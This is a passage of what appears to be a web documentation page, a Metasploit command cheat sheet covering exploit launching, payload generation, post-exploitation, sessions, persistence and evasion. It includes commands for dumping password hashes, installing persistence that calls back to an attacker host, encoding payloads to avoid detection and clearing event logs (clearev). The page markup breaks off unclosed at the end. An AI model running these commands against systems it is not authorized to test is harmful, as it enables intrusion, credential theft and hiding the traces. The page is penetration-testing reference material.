## 3. Exploitation

<Tabs items={["Exploit Usage", "Payload Selection", "Post Exploitation", "Session Management"]}>
  <Tab>
    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">Exploit Usage</h4>
      <div className="space-y-4">
        <div>
          <h5 className="font-bold mb-2">Basic Exploitation</h5>
          ```bash
          # Select exploit
          use exploit/[path]

          # Show targets
          show targets

          # Set target
          set target [number]

          # Check if target is vulnerable
          check

          # Launch exploit
          exploit
          exploit -j  # As background job
          exploit -z  # Don't interact with session
          ```
        </div>
      </div>
    </div>
  </Tab>
  <Tab>
    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">Payload Selection</h4>
      <div className="space-y-4">
        <div>
          <h5 className="font-bold mb-2">Payload Management</h5>
          ```bash
          # Show compatible payloads
          show payloads

          # Set payload
          set payload [payload_path]

          # Generate payload
          generate
          generate -h  # Show options
          generate -f [format]
          generate -e [encoder]
          generate -o [output_file]
          ```
        </div>
      </div>
    </div>
  </Tab>
  <Tab>
    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">Post Exploitation</h4>
      <div className="space-y-4">
        <div>
          <h5 className="font-bold mb-2">Post Modules</h5>
          ```bash
          # Show post modules
          show post

          # Use post module
          use post/[module_path]

          # Run post module
          run

          # Gather system info
          run post/multi/gather/env
          run post/windows/gather/hashdump
          run post/linux/gather/hashdump
          ```
        </div>
      </div>
    </div>
  </Tab>
  <Tab>
    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">Session Management</h4>
      <div className="space-y-4">
        <div>
          <h5 className="font-bold mb-2">Session Commands</h5>
          ```bash
          # List sessions
          sessions -l

          # Interact with session
          sessions -i [id]

          # Kill session
          sessions -k [id]

          # Run command in all sessions
          sessions -C [command]

          # Upgrade shell to meterpreter
          sessions -u [id]
          ```
        </div>
      </div>
    </div>

  <Tab>
    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">

      <div className="space-y-4">
        <div>
          <h5 className="font-bold mb-2">Persistence Mechanisms</h5>
          ```bash
          # Windows persistence
          run persistence -X -i 30 -p 443 -r [LHOST]

          # Scheduled tasks
          run scheduleme

          # Service installation
          run service_persistence

          # Registry persistence
          run persistence -S
          ```
        </div>
      </div>
    </div>
  </Tab>
  <Tab>
    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">

          # Encode payload
          set EnableStageEncoding true
          set StageEncoder x86/shikata_ga_nai

          # Process migration
          run post/windows/manage/migrate

          clearev
